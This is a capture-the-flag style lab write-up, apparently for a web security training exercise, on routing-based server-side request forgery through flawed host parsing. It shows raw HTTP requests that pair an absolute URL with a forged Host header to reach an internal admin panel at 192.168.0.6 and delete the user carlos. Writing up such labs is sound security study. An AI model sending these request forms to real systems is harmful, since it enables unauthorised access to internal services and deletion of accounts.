# Lab: SSRF via flawed request parsing

Description :
This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.

End goal :
To solve the lab, access the internal admin panel located in the `192.168.0.0/24` range, then delete the user `carlos`.

Analysis:

- manipulating host header direct -> 403 Forbidden
- we can inject arbitrary data via port
- when we double the host header both be identical
- when we use absolute URL , we can inject arbitrary Host value

    ```Text
    req
    GET https://0aed003a036763d7846f3ba200f0000c.web-security-academy.net HTTP/2
    Host: 127.0.0.1
    
    res
    HTTP/2 504 Gateway Timeout
    Server Error: Gateway Timeout (3) connecting to 127.0.0.1
    ```

- sending this request -> 302 Found

    ```Text
    GET https://0aed003a036763d7846f3ba200f0000c.web-security-academy.net HTTP/2
    Host: 192.168.0.6
    ```

- we can send our malicoius request using the following  formate

    ```text
    POST https://0aed003a036763d7846f3ba200f0000c.web-security-academy.net/admin/delete HTTP/2
    Host: 192.168.0.6
    ...

    csrf=qP8rdeJQVNx4ixGbYLJSdKq3MhueML83&username=carlos
    ```
